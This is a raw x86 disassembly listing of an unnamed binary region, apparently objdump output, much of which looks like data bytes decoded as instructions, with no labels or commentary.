  44f225:	sbb    edi,esp
  44f227:	push   esp
  44f229:	sbb    edi,esp
  44f22b:	push   esp
  44f22d:	sbb    edi,esp
  44f22f:	push   esp
  44f231:	add    al,0xe7
  44f233:	add    esi,esp
  44f235:	add    al,0xe7
  44f237:	add    esi,esp
  44f239:	add    al,0xe7
  44f23b:	add    esi,esp
  44f23d:	add    al,0xe7
  44f23f:	add    esi,esp
  44f241:	add    al,0xe7
  44f243:	add    esi,esp
  44f245:	add    al,0xe7
  44f247:	add    esi,esp
  44f249:	add    al,0xe7
  44f24b:	add    esi,esp
  44f24d:	add    al,0xe7
  44f24f:	add    esi,esp
  44f251:	add    al,0xe7
  44f253:	add    esi,esp
  44f255:	add    al,0xe7
  44f257:	add    esi,esp
  44f259:	add    al,0xe7
  44f25b:	add    esi,esp
  44f25d:	add    al,0xe7
  44f25f:	add    esi,esp
  44f261:	add    al,0xe7
  44f263:	add    esi,esp
  44f265:	add    al,0xe7
  44f267:	add    eax,DWORD PTR [eax]
	...
  44f281:	hlt    
  44f282:	add    al,0xe7
  44f284:	add    esi,esp
  44f286:	add    al,0xe7
  44f288:	add    esi,esp
  44f28a:	add    al,0xe7
  44f28c:	add    esi,esp
  44f28e:	add    al,0xe7
  44f290:	add    esi,esp
  44f292:	add    al,0xe7
  44f294:	add    esi,esp
  44f296:	add    al,0xe7
  44f298:	add    esi,esp
  44f29a:	add    al,0xe7
  44f29c:	add    esi,esp
  44f29e:	add    al,0xe7
  44f2a0:	add    esi,esp
  44f2a2:	add    al,0xe7
  44f2a4:	add    esi,esp
  44f2a6:	add    al,0xe7
  44f2a8:	add    esi,esp
  44f2aa:	add    al,0xe7
  44f2ac:	add    esi,esp
  44f2ae:	add    al,0xe7
  44f2b0:	add    esi,esp
  44f2b2:	add    al,0xe7
  44f2b4:	add    esi,esp
  44f2b6:	add    al,0xe7
  44f2b8:	add    esi,esp
  44f2ba:	add    al,0xe7
  44f2bc:	add    esi,esp
  44f2be:	add    al,0xe7
  44f2c0:	add    esi,esp
  44f2c2:	add    al,0x0
  44f2c4:	jmp    0xe944f7c0
  44f2c9:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f2d0:	jmp    0xe944f7cc
  44f2d5:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f2dc:	jmp    0xe944f7d8
  44f2e1:	test   DWORD PTR [eax+eax*1],0xe9
	...
  44f2fc:	add    BYTE PTR [eax],al
  44f2fe:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f305:	jmp    0xe944f801
  44f30a:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f311:	jmp    0xe944f80d
  44f316:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f31d:	jmp    0xe944f819
  44f322:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f329:	jmp    0xe944f825
  44f32e:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f335:	jmp    0xe944f831
  44f33a:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f341:	jmp    0xe944f83d
  44f346:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f34d:	jmp    0xe944f849
  44f352:	test   DWORD PTR [eax+eax*1],0x4dd00
  44f359:	add    ch,cl
  44f35b:	add    al,0x0
  44f35d:	add    ch,cl
  44f35f:	add    al,0x0
	...
  44f379:	add    BYTE PTR [eax],al
  44f37b:	popf   
  44f37c:	add    al,0x0
  44f37e:	add    BYTE PTR [ebp-0x72fffffc],bl
  44f384:	add    al,0x0
  44f386:	add    BYTE PTR [ebp-0x62fffffc],cl
  44f38c:	add    al,0x0
  44f38e:	add    BYTE PTR [ebp-0x72fffffc],bl
  44f394:	add    al,0x0
  44f396:	add    BYTE PTR [ebp+0x5d000004],cl
  44f39c:	add    al,0x0
  44f39e:	add    BYTE PTR [ebp+0x4],bl
  44f3a1:	add    BYTE PTR [eax],al
  44f3a3:	dec    ebp
  44f3a4:	add    al,0x0
  44f3a6:	add    BYTE PTR [ebp+0x4],cl
  44f3a9:	add    BYTE PTR [eax],al
  44f3ab:	pop    ebp
  44f3ac:	add    al,0x0
  44f3ae:	add    BYTE PTR [ebp+0x4],bl
  44f3b1:	add    BYTE PTR [eax],al
  44f3b3:	dec    ebp
  44f3b4:	add    al,0x0
  44f3b6:	add    BYTE PTR [ebp+0x4],cl
  44f3b9:	add    BYTE PTR [eax],al
  44f3bb:	sbb    eax,0x1d000004
  44f3c0:	add    al,0x0
  44f3c2:	add    BYTE PTR ds:0xd000004,cl
  44f3c8:	add    al,0x0
  44f3ca:	add    BYTE PTR ds:0x1d000004,bl
  44f3d0:	add    al,0x0
  44f3d2:	add    BYTE PTR ds:0xd000004,cl
  44f3d8:	add    al,0x0
  44f3da:	add    ch,bl
  44f3dc:	add    eax,DWORD PTR [eax]
	...
  44f3f6:	add    BYTE PTR [eax],al
  44f3f8:	fld    QWORD PTR [ebx]
  44f3fa:	add    BYTE PTR [eax],al
  44f3fc:	int    0x3
  44f3fe:	add    BYTE PTR [eax],al
  44f400:	hlt    
  44f401:	sbb    eax,0x1df4fffc
  44f406:	cld    
  44f407:	push   esp
  44f409:	sbb    eax,0x1df4fffc
  44f40e:	cld    
  44f40f:	push   esp
  44f411:	sbb    eax,0x1df4fffc
  44f416:	cld    
  44f417:	push   esp
  44f419:	sbb    eax,0x1df4fffc
  44f41e:	cld    
  44f41f:	push   esp
  44f421:	das    
  44f422:	jmp    0x44f457
  44f424:	int3   
  44f425:	pop    ds
  44f426:	push   ecx
  44f427:	mov    ds:0x184c8e2d,eax
  44f42c:	dec    eax
  44f42d:	inc    ebx
  44f42e:	ins    BYTE PTR es:[edi],dx
  44f42f:	arpl   WORD PTR [ebx],bx
  44f431:	test   eax,0x759b603a
  44f436:	fucomip st,st(4)
  44f438:	mov    esp,0x723c80aa
  44f43d:	adc    al,0xe6
  44f43f:	(bad)  [ecx]
  44f441:	shl    BYTE PTR [edi+0x6039a56],0x7a
  44f448:	jmp    0x37ac4274
  44f44d:	test   BYTE PTR [ebp+0xfe0c0cd],0x21
  44f454:	push   ss
  44f455:	inc    eax
  44f456:	add    eax,DWORD PTR gs:[ebx]
  44f459:	cmp    DWORD PTR [ecx+0x9],0x0
	...
  44f474:	add    BYTE PTR [ebx-0x5adf5db3],bl
  44f47a:	adc    DWORD PTR [eax+0x26],ebx
  44f47d:	out    0xc7,eax
  44f47f:	mov    eax,ds:0xe8205ce6
  44f484:	ds out dx,al
  44f486:	dec    edx
  44f487:	and    ebp,0x52
  44f48a:	pop    ebx
  44f48b:	push   esi
  44f48c:	adc    esi,DWORD PTR ds:[ebx+0x5b7463f]
  44f493:	addr16 daa 
  44f495:	pop    ebx
  44f496:	jmp    0x44f4e0
  44f498:	in     eax,0x7
  44f49a:	iret   
  44f49b:	icebp  
  44f49c:	ret    
  44f49d:	pop    ss
  44f49e:	in     eax,0x7
  44f4a0:	inc    edi
  44f4a1:	xor    al,0x9c
  44f4a3:	cmp    al,0x82
  44f4a5:	in     al,0xe9
  44f4a7:	icebp  
  44f4a8:	and    al,0xee
  44f4aa:	js     0x44f4ae
  44f4ac:	nop
  44f4ad:	mov    cl,0x99
  44f4af:	mov    ah,0xb1
  44f4b1:	loop   0x44f526
  44f4b3:	sahf   
  44f4b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44f4b5:	outs   dx,BYTE PTR ds:[esi]
  44f4b6:	addr16 pop edi
  44f4b8:	in     al,dx
  44f4b9:	jb     0x44f43f
  44f4bb:	repnz test dl,dl
  44f4be:	xor    BYTE PTR [ebx-0x25],dl
  44f4c1:	jne    0x44f4f6
  44f4c3:	jge    0x44f4c7
  44f4c5:	inc    esp
  44f4c6:	clc    
  44f4c7:	mov    ebx,DWORD PTR [edi]
  44f4c9:	push   ebp
  44f4ca:	ins    DWORD PTR es:[edi],dx
  44f4cb:	cmp    DWORD PTR [ebp-0x3029ba99],ebp
  44f4d1:	xchg   ebp,eax
  44f4d2:	pop    eax
  44f4d3:	outs   dx,DWORD PTR ds:[esi]
  44f4d4:	ss clc 
  44f4d6:	loope  0x44f4a9
  44f4d8:	ins    DWORD PTR es:[edi],dx
	...
  44f4f1:	add    BYTE PTR [edx-0x5d],bl
  44f4f4:	inc    esi
  44f4f5:	mov    ebx,0x5b60b7e0
  44f4fa:	push   ds
  44f4fb:	ror    DWORD PTR [edx],0x64
  44f4fe:	sub    eax,0x50e7255c
  44f503:	cdq    
  44f504:	push   esp
  44f505:	daa    
  44f506:	mov    dl,0x54
  44f508:	stos   BYTE PTR es:[edi],al
  44f509:	popa   
  44f50a:	fistp  DWORD PTR [edi+0x7e3bc4a4]
  44f510:	test   dh,ah
  44f512:	push   ebp
  44f513:	and    al,BYTE PTR [eax+0x1d]
  44f516:	xchg   eax,ecx
  44f518:	mov    al,0x1
  44f51a:	int3   
  44f51b:	fild   DWORD PTR [ecx]
  44f51d:	mov    eax,0xc1a6224e
  44f522:	adc    DWORD PTR [ecx+0x22686aff],ebp
  44f528:	and    al,0x1
  44f52a:	push   esp
  44f52b:	inc    eax
  44f52c:	sbb    al,BYTE PTR [esi+0x658ac67e]
  44f532:	mov    ah,BYTE PTR [ecx-0x76bae58a]
  44f538:	in     eax,dx
  44f539:	jmp    0x44f4f1
  44f53b:	sbb    BYTE PTR [ecx-0x58],bl
  44f53e:	inc    ebp
  44f53f:	jb     0x44f4d1
  44f541:	push   ds
  44f542:	mov    dl,BYTE PTR [edx]
  44f544:	scas   eax,DWORD PTR es:[edi]
  44f545:	fcmovne st,st(6)
  44f547:	xlat   BYTE PTR ds:[ebx]
  44f548:	sbb    eax,0xcf3bbbe3
  44f54d:	stos   DWORD PTR es:[edi],eax
  44f54e:	in     eax,0x9a
  44f550:	inc    esp
  44f551:	add    DWORD PTR [ebx+0x18],ecx
  44f554:	xchg   edi,eax
  44f555:	test   BYTE PTR [eax],al
	...
  44f56f:	pop    es
  44f570:	sar    ebp,0xc8
  44f573:	mov    ch,0x58
  44f575:	mov    edx,0xe9580006
  44f57a:	pop    esp
  44f57b:	sub    BYTE PTR [edi+0x5656d6d5],cl
  44f581:	cs or  al,0x17
  44f584:	repnz test eax,0xa75cda73
  44f58a:	fwait
  44f58b:	iret   
  44f58c:	shr    DWORD PTR ds:0xbbad8f43,0x17
  44f593:	dec    esi
  44f594:	cld    
  44f595:	cmp    ch,ah
  44f597:	jle    0x44f5e0
  44f599:	imul   edi,DWORD PTR [edx+0x4e819bb9],0xffffffd8
  44f5a0:	xor    dl,0x84
  44f5a3:	push   edi
  44f5a4:	lds    esi,FWORD PTR ds:0xcb0e9ac3
  44f5aa:	xor    BYTE PTR [edi+0xa],dh
  44f5ad:	xor    eax,0x1c264301
  44f5b2:	jecxz  0x44f571
  44f5b4:	xchg   esi,eax
  44f5b5:	rol    BYTE PTR [eax],cl
  44f5b7:	and    BYTE PTR [edi+0x47],dl
  44f5ba:	cmp    ecx,DWORD PTR [edi+0x77b6351f]
  44f5c0:	pop    ebx
  44f5c1:	retf   
  44f5c2:	das    
  44f5c3:	xchg   DWORD PTR [edx+0xb5dba36],esp
  44f5c9:	out    dx,eax
  44f5ca:	cwde   
  44f5cb:	push   esi
  44f5cc:	loopne 0x44f635
  44f5ce:	icebp  
  44f5cf:	sbb    esi,DWORD PTR [edx+0xcda7]
	...
  44f5e9:	add    BYTE PTR [eax],al
  44f5eb:	add    BYTE PTR [ecx-0x5e],dl
  44f5ee:	xchg   BYTE PTR [edi+0x50],bl
  44f5f1:	repnz sub bl,bh
  44f5f4:	and    ah,0xe2
  44f5f7:	pop    esp
  44f5f8:	mov    esp,0xab6e5b72
  44f5fd:	int    0x86
  44f5ff:	cld    
  44f600:	jb     0x44f67a
  44f602:	push   cs
  44f603:	fwait
  44f604:	pop    edx
  44f605:	mov    al,ds:0x57ee3fc6
  44f60a:	out    0xc4,al
  44f60c:	loop   0x44f592
  44f60e:	xchg   esi,eax
  44f60f:	xor    ecx,ecx
  44f611:	add    BYTE PTR [ebx-0x7d],bl
  44f614:	and    eax,ebp
  44f616:	lods   al,BYTE PTR ds:[esi]
  44f617:	pop    eax
  44f618:	sbb    dl,BYTE PTR [edx]
  44f61a:	sub    eax,0xf2406448
  44f61f:	imul   esp,DWORD PTR [ebx-0x40ddcbaa],0x3d
  44f626:	fnsave [edx]
  44f628:	push   ds
  44f629:	shl    BYTE PTR [edi],0x41
  44f62c:	cdq    
  44f62d:	push   esi
  44f62e:	out    dx,eax
  44f62f:	mov    WORD PTR [ebp-0x7c472499],?
  44f635:	jne    0x44f60d
  44f637:	cmp    BYTE PTR [ecx-0x53032d8c],0xd6
  44f63e:	fstp   DWORD PTR ds:0xce5d78c8
  44f644:	cmp    BYTE PTR [edx+0x37f447cb],cl
  44f64a:	test   eax,0xedc1acac
  44f64f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  44f668:	add    BYTE PTR [ebx+0x34],cl
  44f66b:	dec    ebx
  44f66c:	fadd   QWORD PTR [edi+0x480ab5f6]
  44f672:	xchg   ebx,eax
  44f673:	in     eax,0x1e
  44f675:	inc    ebx
  44f676:	pop    edx
  44f677:	add    ch,ch
  44f679:	mov    esp,0xe5cbba65
  44f67e:	(bad)  
  44f67f:	jecxz  0x44f62c
  44f681:	fild   WORD PTR [eax-0x74]
  44f684:	sbb    al,0x27
  44f686:	mov    WORD PTR [ebp-0x1de801fd],ss
  44f68c:	ror    DWORD PTR [ecx],cl
  44f68e:	sub    eax,DWORD PTR [eax+edx*4]
  44f691:	jo     0x44f70f
  44f693:	loope  0x44f658
  44f695:	pminub mm3,QWORD PTR [eax]
  44f698:	lahf   
  44f699:	xchg   edx,eax
  44f69a:	fidivr WORD PTR [edi]
  44f69c:	mov    ?,WORD PTR [esi]
  44f69e:	iret   
  44f69f:	loope  0x44f673
  44f6a1:	enter  0xcb50,0xcc
  44f6a5:	and    DWORD PTR [eax-0x3690ae15],edx
  44f6ab:	pop    es
  44f6ac:	mov    ch,ah
  44f6ae:	mov    WORD PTR [edx-0x1],cs
  44f6b1:	jg     0x44f6dc
  44f6b3:	pop    edx
  44f6b4:	ret    
  44f6b5:	ror    DWORD PTR [edi-0x4435ae15],0x2c
  44f6bc:	leave  
  44f6bd:	ror    BYTE PTR [edi-0x6580cf92],1
  44f6c3:	or     ecx,DWORD PTR [ebx+0x468500c2]
  44f6c9:	in     al,dx
  44f6ca:	lea    eax,[edx-0x4]
	...
  44f6e5:	add    BYTE PTR [edi-0x5e],ch
  44f6e8:	pop    ds
  44f6e9:	mov    ebp,edx
  44f6eb:	test   BYTE PTR [eax],bh
  44f6ed:	imul   esp,DWORD PTR [eax-0x50c07ff5],0xffffff98
  44f6f4:	std    
  44f6f5:	jmp    0xc119:0x8b59c30d
  44f6fc:	mov    esp,0xeb8fa1cc
  44f701:	adc    DWORD PTR [eax],0xffffffe8
  44f704:	test   BYTE PTR [ebp-0x14],al
  44f707:	lea    eax,[edx-0x20]
  44f70a:	jg     0x44f6dc
  44f70c:	fisttp WORD PTR [ebx+0x50fc2541]
  44f712:	and    BYTE PTR [edx+edx*2-0x1c37901c],cl
  44f719:	mov    edi,DWORD PTR [ebx*4-0x7403b304]
  44f720:	dec    edx
  44f721:	clc    
  44f722:	outs   dx,DWORD PTR ds:[esi]
  44f723:	mov    eax,0xe9368bf7
  44f728:	cld    
  44f729:	inc    esp
  44f72a:	cld    
  44f72b:	mov    eax,DWORD PTR [edx-0x18]
  44f72e:	jg     0x44f700
  44f730:	test   DWORD PTR [ebx+0x54fce545],0xf0528bec
  44f73a:	jg     0x44f704
  44f73c:	test   DWORD PTR [ebx+0x4cfd013c],0xfc4a8bec
  44f746:	mov    bl,0xc8
  44f748:	repz add BYTE PTR [eax],al
	...
  44f763:	hlt    
  44f764:	add    al,0x0
  44f766:	jmp    0x44f765
  44f768:	lea    edx,[edx-0xc]
  44f76b:	ja     0x44f7b4
  44f76d:	dec    BYTE PTR [eax+0x458418c1]
  44f773:	dec    esp
  44f774:	mov    cs,WORD PTR [edx-0xc]
  44f777:	bswap  ebp
  44f779:	pop    ss
  44f77a:	jae    0x44f728
  44f77c:	lea    edx,[edx-0x10]
  44f77f:	outs   dx,DWORD PTR ds:[esi]
  44f780:	pop    es
  44f781:	std    
  44f782:	inc    esp
  44f783:	cld    
  44f784:	mov    eax,DWORD PTR [edx-0x24]
  44f787:	sahf   
  44f788:	adc    ch,BYTE PTR [eax-0x54]
  44f78b:	test   esp,0x40a98aff
  44f791:	dec    esi
  44f792:	call   0x44fb3b
  44f797:	ja     0x44f7e2
  44f799:	or     eax,DWORD PTR [ebp-0x74eb67cc]
  44f79f:	mov    eax,ds:0xdc458418
  44f7a4:	adc    DWORD PTR [ecx+0x4a8c440c],esi
  44f7aa:	in     al,dx
  44f7ab:	outs   dx,DWORD PTR ds:[esi]
  44f7ac:	mov    bh,0xeb
  44f7ae:	mov    esi,DWORD PTR [ecx]
  44f7b0:	and    DWORD PTR [esp+eax*1+0x8430564],eax
  44f7b7:	fisttp WORD PTR [edi]
  44f7b9:	test   DWORD PTR [ebp-0x3c],ecx
  44f7bc:	test   DWORD PTR [esi-0x103092fc],edi
  44f7c2:	jmp    0x44f81c
  44f7c4:	aad    0xbf
  44f7c6:	mov    eax,DWORD PTR [eax]
	...
  44f7e0:	xchg   ecx,eax
  44f7e1:	mov    edi,0x50b0ccbc
  44f7e6:	retf   
  44f7e7:	int3   
  44f7e8:	test   al,0x50
  44f7ea:	retf   
  44f7eb:	int3   
  44f7ec:	rcl    BYTE PTR [eax-0x35],0xcc
  44f7f0:	and    DWORD PTR [esi-0x36f7c15],ecx
  44f7f6:	out    0x5,eax
  44f7f8:	jnp    0x44f81b
  44f7fa:	clc    
  44f7fb:	mov    DWORD PTR [ecx+0x5c45842c],edi
  44f801:	mov    ah,0xe7
  44f803:	sub    DWORD PTR [ebx+0x21],esp
  44f806:	clc    
  44f807:	xor    DWORD PTR [eax],0x8
  44f80a:	popf   
  44f80b:	inc    esp
  44f80c:	dec    esi
  44f80d:	(bad)  
  44f810:	mov    BYTE PTR ds:0xcf6f0040,al
  44f816:	out    0x51,eax
  44f818:	cmp    esi,edi
  44f81a:	inc    ebx
  44f81b:	cli    
  44f81c:	mov    bh,0x4
  44f81e:	popf   
  44f81f:	dec    eax
  44f820:	cs (bad) 
  44f824:	hlt    
  44f825:	scas   al,BYTE PTR es:[edi]
  44f826:	jmp    DWORD PTR [edi+0x28]
  44f829:	add    eax,0xf7130040
  44f82e:	inc    edi
  44f82f:	cli    
  44f830:	mov    bh,0x4
  44f832:	xchg   DWORD PTR [ebp+0xc],eax
  44f835:	dec    ecx
  44f836:	inc    edx
  44f837:	cld    
  44f838:	hlt    
  44f839:	add    al,0x0
  44f83b:	add    bh,bl
  44f83d:	push   cs
  44f83e:	test   DWORD PTR [ebp-0x18],edx
  44f841:	test   BYTE PTR [ebp+0x1],bh
	...
  44f85b:	add    BYTE PTR [eax],al
  44f85d:	ins    DWORD PTR es:[edi],dx
  44f85e:	mov    edx,0x215983fb
  44f863:	pop    es
  44f864:	jae    0x44f87b
  44f866:	mov    WORD PTR [edx-0x4],es
  44f869:	jg     0x44f87c
  44f86b:	or     DWORD PTR [edi+esi*8+0x6f50ffc4],0xffffffba
  44f873:	out    0x52,eax
  44f875:	mov    bl,0xfa
  44f877:	inc    ebx
  44f878:	cli    
  44f879:	aaa    
  44f87a:	add    eax,0x8ea04d85
  44f87f:	add    ecx,DWORD PTR [ebp+0x3c1b30]
  44f885:	lahf   
  44f886:	xor    eax,0x4429e584
  44f88b:	retf   
  44f88c:	int3   
  44f88d:	mov    al,0x51
  44f88f:	retf   
  44f890:	int3   
  44f891:	test   al,0x51
  44f893:	retf   
  44f894:	int3   
  44f895:	inc    eax
  44f896:	push   ecx
  44f897:	retf   
  44f898:	int3   
  44f899:	ror    DWORD PTR [ebx+0x1b94a1eb],0x3c
  44f8a0:	add    BYTE PTR [edx],bl
  44f8a2:	mov    WORD PTR [edi],?
  44f8a4:	xor    BYTE PTR [edi-0x2e],bh
  44f8a7:	pop    es
  44f8a8:	ds jge 0x44f878
  44f8ab:	pop    es
  44f8ac:	pop    ebp
  44f8ad:	aaa    
  44f8ae:	push   ecx
  44f8af:	retf   
  44f8b0:	int3   
  44f8b1:	sub    BYTE PTR [ecx-0x35],dl
  44f8b4:	int3   
  44f8b5:	inc    eax
  44f8b6:	push   ecx
  44f8b7:	retf   
  44f8b8:	int3   
  44f8b9:	ror    DWORD PTR [ebx+0x10b98beb],0x50
  44f8c0:	mov    eax,DWORD PTR [eax]
	...
  44f8da:	test   eax,0xe9ff4f0c
  44f8df:	enter  0x43f5,0xf4
  44f8e3:	sar    DWORD PTR [esp+ecx*8-0x3334aed0],0x28
  44f8eb:	push   ecx
  44f8ec:	retf   
  44f8ed:	int3   
  44f8ee:	rcl    BYTE PTR [eax-0x35],0xcc
  44f8f2:	inc    ecx
  44f8f3:	mov    ebx,gs
  44f8f5:	adc    eax,0xc
  44f8f8:	data16 add BYTE PTR [esi+0x5],cl
  44f8fc:	push   0xffc4f7dc
  44f901:	(bad)  
  44f902:	loope  0x44f8d0
  44f904:	cmc    
  44f905:	inc    ebx
  44f906:	hlt    
  44f907:	lea    eax,[edx-0x8]
  44f90a:	dec    esp
  44f90b:	sub    eax,0x8bf43ffc
  44f910:	inc    edx
  44f911:	clc    
  44f912:	inc    esp
  44f913:	sub    eax,0x1fa3ffb5
  44f918:	jl     0x44f8de
  44f91a:	in     al,dx
  44f91b:	lea    eax,[edx-0x4]
  44f91e:	jg     0x44f8f1
  44f920:	sqrtps xmm7,XMMWORD PTR [edi-0x47]
  44f924:	or     edx,DWORD PTR [edx+0x6f]
  44f927:	leave  
  44f928:	pop    es
  44f929:	push   eax
  44f92a:	jnp    0x44f8e5
  44f92c:	sti    
  44f92d:	mov    ebx,DWORD PTR [ecx-0x3f]
  44f930:	mov    esp,0xeb8bc1cc
  44f935:	push   ecx
  44f936:	cmp    ecx,ecx
  44f938:	sti    
  44f939:	add    ah,dh
  44f93b:	add    al,0x0
  44f93d:	jmp    0x44f93f
	...
  44f957:	std    
  44f958:	mov    eax,DWORD PTR [edx-0x4]
  44f95b:	ja     0x44f9a1
  44f95d:	dec    BYTE PTR [eax+0x4d8420b9]
  44f963:	cmp    bl,bl
  44f965:	dec    edx
  44f966:	adc    BYTE PTR [edi-0x3aa7b01],ah
  44f96c:	add    edx,DWORD PTR [ebx-0x4]
  44f96f:	repz push esi
  44f971:	std    
  44f972:	mov    ch,BYTE PTR [ecx+0x104cfd10]
  44f978:	lss    edx,FWORD PTR [ecx]
  44f97b:	iret   
  44f97c:	inc    edx
  44f97d:	jae    0x44f986
  44f97f:	cmp    al,0x5
  44f981:	add    BYTE PTR [eax],al
  44f983:	hlt    
  44f984:	sub    eax,DWORD PTR [ebx]
  44f986:	jmp    0x44f94c
  44f988:	sar    BYTE PTR [edi-0x433f2e75],cl
  44f98e:	int3   
  44f98f:	mov    al,0x51
  44f991:	retf   
  44f992:	int3   
  44f993:	test   al,0x51
  44f995:	retf   
  44f996:	int3   
  44f997:	rcl    BYTE PTR [ecx-0x35],0xcc
  44f99b:	and    DWORD PTR [edx+0x4dcb9eb],ecx
  44f9a1:	add    BYTE PTR [eax],al
  44f9a3:	push   eax
  44f9a4:	mov    al,BYTE PTR [esi]
  44f9a6:	mov    DWORD PTR [ecx],eax
  44f9a8:	gs cmc 
  44f9aa:	inc    ebx
  44f9ab:	hlt    
  44f9ac:	mov    edi,0x51b0ccbc
  44f9b1:	retf   
  44f9b2:	int3   
  44f9b3:	test   al,0x51
  44f9b5:	retf   
  44f9b6:	int3   
  44f9b7:	rcl    BYTE PTR [ecx-0x35],0xcc
	...
  44f9d3:	add    BYTE PTR [ecx],ah
  44f9d5:	mov    ch,bl
  44f9d7:	adc    DWORD PTR [eax-0x13ba7b0b],0xffffff81
  44f9de:	ja     0x44f9e4
  44f9e0:	hlt    
  44f9e1:	or     eax,0x4f48884
  44f9e6:	add    BYTE PTR [ebx+0x51850cb1],cl
  44f9ec:	lock and ebp,0x862b2508
  44f9f3:	push   ebp
  44f9f4:	inc    eax
  44f9f5:	mov    al,BYTE PTR [edx+0x8]
  44f9f8:	ja     0x44fa3f
  44f9fa:	pop    es
  44f9fb:	mov    DWORD PTR [ecx+0x3045c014],esi
  44fa01:	add    eax,0x29f40000
  44fa06:	push   es
  44fa07:	mov    esi,DWORD PTR [ecx-0xa3e83e0]
  44fa0d:	mov    ecx,DWORD PTR [edx-0x4]
  44fa10:	jg     0x44f9ca
  44fa12:	sti    
  44fa13:	cmp    esp,DWORD PTR [ecx+0x6f466c18]
  44fa19:	enter  0x8bfb,0xa9
  44fa1d:	adc    al,0x8
  44fa1f:	mov    bh,0x8
  44fa21:	les    edi,FWORD PTR [esi-0xa7e0706]
  44fa27:	add    ebp,DWORD PTR [ecx-0x2d]
  44fa2a:	test   BYTE PTR [ebp-0x28],al
  44fa2d:	mov    DWORD PTR [edx-0x10],ecx
  44fa30:	add    edx,DWORD PTR [esi+0x13]
  44fa33:	inc    ecx
  44fa34:	jne    0x44fa58
  44fa36:	clc    
  44fa37:	sldt   WORD PTR [eax]
	...
  44fa4e:	add    BYTE PTR [eax],al
  44fa50:	add    ah,dh
  44fa52:	add    al,0x87
  44fa54:	push   ebp
  44fa55:	mov    esp,0x7f084289
  44fa5a:	iret   
  44fa5b:	or     eax,DWORD PTR [ebx]
  44fa5d:	cld    
  44fa5e:	mov    DWORD PTR [edx-0x8],edx
  44fa61:	outs   dx,DWORD PTR ds:[esi]
  44fa62:	or     BYTE PTR [edi],cl
  44fa64:	add    esi,DWORD PTR [ecx]
  44fa66:	cmc    
  44fa67:	test   BYTE PTR [ebp-0x4],cl
  44fa6a:	mov    DWORD PTR [edx+0xc],edx
  44fa6d:	div    ebx
  44fa6f:	test   BYTE PTR [ebp+0x7c],cl
  44fa72:	mov    eax,DWORD PTR [ebx]
  44fa74:	or     cl,BYTE PTR [edi-0x3aa7b95]
  44fa7a:	mov    DWORD PTR [edx+0x8],eax
  44fa7d:	test   edx,0xcb98903
  44fa83:	out    0x6b,eax
  44fa85:	pop    ebx
  44fa86:	sbb    eax,0xbf598bf8
  44fa8b:	mov    esp,0xeb89a1cc
  44fa90:	adc    DWORD PTR [eax-0x18],0xffffff84
  44fa94:	inc    ebp
  44fa95:	in     al,dx
  44fa96:	mov    eax,DWORD PTR [edx-0x1c]
  44fa99:	jg     0x44fa6a
  44fa9b:	jecxz  0x44fa28
  44fa9d:	shr    DWORD PTR [eax],0xfc
  44faa0:	push   eax
  44faa1:	loopne 0x44fa2e
  44faa3:	push   edx
  44faa4:	call   0x8c2cc218
  44faa9:	jl     0x44fa2f
  44faab:	(bad)  
  44faac:	push   esp
  44faae:	mov    ecx,DWORD PTR [edx-0x10]
  44fab1:	ja     0x44fa52
  44fab3:	out    dx,eax
	...
  44facc:	add    BYTE PTR [eax],al
  44face:	jmp    0x44fa58
  44fad0:	hlt    
  44fad1:	add    ah,dh
  44fad3:	add    al,0x85
  44fad5:	push   ebp
  44fad6:	cld    
  44fad7:	pop    es
  44fad8:	push   ebx
  44fad9:	lock ins DWORD PTR es:[edi],dx
  44fadb:	mov    dl,0xdf
  44fadd:	mov    esi,DWORD PTR [ecx]
  44fadf:	and    eax,0x4e4787c
  44fae4:	or     DWORD PTR [ecx+edx*8+0x4e000005],eax
  44faeb:	add    eax,0xca6f0066
  44faf0:	fisttp WORD PTR [ebx+0x50fd0d49]
  44faf6:	clc    
  44faf7:	mov    dh,0xf8
  44faf9:	adc    eax,0x3c1f2c
  44fafe:	ins    DWORD PTR es:[edi],dx
  44faff:	ret    0x8bfb
  44fb02:	cmp    DWORD PTR ds:0x90f4387c,esp
  44fb08:	push   ss
  44fb09:	mov    esi,DWORD PTR [ecx]
  44fb0b:	and    eax,0x7ec5584
  44fb10:	jns    0x45c90bdf
  44fb16:	push   esp
  44fb17:	nop
  44fb18:	dec    edx
  44fb19:	or     bh,dh
  44fb1b:	int3   
  44fb1c:	jns    0x182923cb
  44fb22:	jg     0x44fad6
  44fb24:	fisttp WORD PTR [ebx+0x41fd0cb1]
  44fb2a:	in     al,0x8d
  44fb2c:	inc    edx
  44fb2d:	hlt    
  44fb2e:	outs   dx,DWORD PTR ds:[esi]
  44fb2f:	retf   0x8bdf
	...
  44fb4a:	add    cl,cl
  44fb4c:	or     al,0xfd
  44fb4e:	adc    BYTE PTR [ebp-0x4e],bh
  44fb51:	jmp    0x44fb1a
  44fb53:	mov    ecx,0xf4ffff1c
  44fb58:	add    al,0x85
  44fb5a:	inc    ebp
  44fb5b:	adc    al,0x88
  44fb5d:	ja     0x44fb6f
  44fb5f:	hlt    
  44fb60:	nop
  44fb61:	or     BYTE PTR [ebx+0x397c24b1],cl
  44fb67:	hlt    
  44fb68:	nop
  44fb69:	add    bh,al
  44fb6b:	cmp    DWORD PTR ds:0x4f4fffe,ebx
  44fb71:	test   DWORD PTR [ebp-0x18],edx
  44fb74:	xchg   DWORD PTR ds:0x84a66000,esi
  44fb7a:	inc    ebp
  44fb7b:	enter  0x78f,0x81
  44fb7f:	aad    0x4
  44fb81:	add    BYTE PTR [eax],al
  44fb83:	je     0x44fb15
  44fb85:	sbb    ecx,DWORD PTR [ebx+0x2841121]
  44fb8b:	fstp   DWORD PTR [ebx]
  44fb8d:	clc    
  44fb8e:	jmp    FWORD PTR [ebx]
  44fb90:	mov    ch,0x84
  44fb92:	dec    ebp
  44fb93:	mov    al,ds:0x99b5e7b5
  44fb98:	sbb    edi,eax
  44fb9a:	cmp    DWORD PTR [eax-0x57ba78f4],0x2f
  44fba1:	sbb    ecx,DWORD PTR [ebx+0x2841129]
